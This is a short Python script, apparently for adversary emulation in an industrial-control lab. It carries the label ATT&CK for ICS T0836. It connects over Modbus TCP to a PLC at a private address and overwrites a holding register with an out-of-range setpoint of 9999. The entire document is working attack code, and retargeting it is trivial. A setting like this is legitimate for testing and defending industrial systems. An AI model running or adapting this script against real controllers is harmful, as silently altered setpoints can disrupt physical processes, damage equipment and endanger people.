#!/usr/bin/env python3
"""
ATT&CK for ICS T0836 - Modify Parameter

Rewrites a holding register (simulated setpoint) to an out-of-range
value. Unlike the coil write, this targets a process *parameter* rather
than a discrete actuator - the ICS equivalent of silently changing an
alarm threshold or control setpoint.
"""
from pymodbus.client import ModbusTcpClient

PLC_HOST = "172.20.0.10"
PLC_PORT = 502
ROGUE_SETPOINT = 9999  # clearly outside any sane process range

client = ModbusTcpClient(PLC_HOST, port=PLC_PORT)
if client.connect():
    # function code 0x06 - write single holding register
    rr = client.write_register(0, ROGUE_SETPOINT)
    print(f"write_register(0, {ROGUE_SETPOINT}) -> {rr}")
    client.close()
else:
    print("connection failed")
